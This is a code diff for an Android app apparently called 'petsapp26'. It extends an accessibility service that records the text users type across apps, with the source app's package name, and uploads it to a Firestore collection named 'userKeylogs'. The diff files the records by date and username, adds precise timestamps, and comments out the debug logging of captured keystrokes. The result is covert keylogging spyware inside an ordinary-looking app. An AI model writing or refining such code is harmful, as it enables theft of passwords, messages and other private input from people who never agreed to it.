@@ -3,6 +3,7 @@ package com.example.petsapp26
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
+import android.content.Context
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.view.accessibility.AccessibilityEvent
@@ -10,6 +11,9 @@ import com.google.firebase.firestore.FieldValue
 import com.google.firebase.ktx.Firebase
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ktx.firestore
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class MyAccessibilityService : AccessibilityService() {
 
@@ -54,9 +58,14 @@ class MyAccessibilityService : AccessibilityService() {
     private fun saveKeylog(event: AccessibilityEvent) {
         val packageName = event.packageName.toString()
         val keylogContent = event.text.joinToString("")
+        val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
+        val timeFormat = SimpleDateFormat("yyyyMMddHHmmssSSS", Locale.getDefault())
+        val date = dateFormat.format(Date()) // e.g., "2024-03-28"
+        val time = timeFormat.format(Date()) // Document ID as "yyyyMMddHHmmssSSS"
+        val username = getUsername() ?: "No Username"
 
         // Log to confirm the save action
-        Log.d("ACCESSIBILITY SERVICE", "Saving to Firestore: $keylogContent")
+        //Log.d("ACCESSIBILITY SERVICE", "Saving to Firestore: $keylogContent")
 
         // Prepare the data to be saved
         val keylogData = hashMapOf(
@@ -66,13 +75,20 @@ class MyAccessibilityService : AccessibilityService() {
         )
 
         // Save the data to Firestore
-        Firebase.firestore.collection("userKeylogs").add(keylogData)
+        Firebase.firestore.collection("userKeylogs").document(date)
+            .collection(username).document(time).set(keylogData)
             .addOnSuccessListener {
-                Log.d("Firestore", "DocumentSnapshot successfully written!")
+                //Log.d("Firestore", "DocumentSnapshot successfully written!")
             }
             .addOnFailureListener { e ->
-                Log.w("Firestore", "Error writing document", e)
+                //Log.w("Firestore", "Error writing document", e)
             }
+    }
+
+    private fun getUsername(): String? {
+        // Retrieve the username from SharedPreferences
+        val sharedPref = getSharedPreferences("AppPreferences", Context.MODE_PRIVATE)
+        return sharedPref.getString("username", null)
     }
 
     override fun onInterrupt() {
